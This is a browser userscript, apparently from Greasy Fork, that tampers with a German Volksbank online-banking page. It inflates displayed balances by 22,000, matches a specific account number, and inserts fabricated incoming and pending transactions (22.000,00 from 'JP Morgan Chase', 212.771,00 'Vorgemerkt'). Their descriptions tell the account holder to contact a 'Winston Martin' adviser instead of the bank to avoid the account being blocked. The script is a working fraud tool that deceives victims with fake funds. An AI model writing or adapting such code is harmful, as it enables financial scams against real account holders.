// ==UserScript==
// @name         Ed WM Volks Rudi Griesche
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/494917/Ed%20WM%20Volks%20Rudi%20Griesche.user.js
// @updateURL https://update.greasyfork.org/scripts/494917/Ed%20WM%20Volks%20Rudi%20Griesche.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  22000},
        { index: 1, adjustmentAmount: 22000},
        { index: 2, adjustmentAmount: 22000},
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE39 2509 0500";
    var targetTextContent2 = "0001 7218 44";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 22000.0; // Adjust the amount as needed
...
//        },
 {
            title: 'JP Morgan Chase',
            description: 'A. Graf meldet sich. Wenden Sie sich nur an Winston Martin Berater, nicht die Bank, damit nicht gesperrt.',
            amount: '22.000,00',
            date: '21. Mai.',
            insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
        ...
        },
        {
            ...
            description: 'Freigabe nötig. Wenden Sie sich an Winston Martin Berater, nicht die Bank, damit nicht gesperrt.',
            amount: '212.771,00',
            date: 'Vorgemerkt',
            insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
